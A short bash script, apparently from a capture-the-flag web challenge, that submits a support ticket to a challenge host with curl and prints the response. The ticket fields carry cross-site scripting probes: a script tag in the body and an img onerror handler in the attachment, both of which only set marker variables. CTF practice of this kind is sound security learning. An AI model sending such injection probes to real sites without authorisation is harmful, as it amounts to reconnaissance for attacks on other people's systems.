#!/bin/bash
HOST="6e197819-b3b8-423c-b184-ac91fd95fe81.red.cyberkent.uz"
DIR=~/ctf/web/marosim
cd "$DIR"
JAR=cookies.txt

echo "---submit ticket with XSS probe---"
curl -s -m 8 -b "$JAR" -c "$JAR" -L -X POST "http://$HOST/ticket" \
  --data-urlencode "subject=Test Subject XSSPROBE123" \
  --data-urlencode "body=<script>window.__xsstest=1</script>BODYPROBE" \
  --data-urlencode "link=http://example.com" \
  --data-urlencode "attachment=<img src=x onerror=window.__xsstest2=1>ATTACHPROBE" \
  -o submit_out.html -w "HTTP:%{http_code} URL:%{url_effective}\n"

echo "---output---"
cat submit_out.html
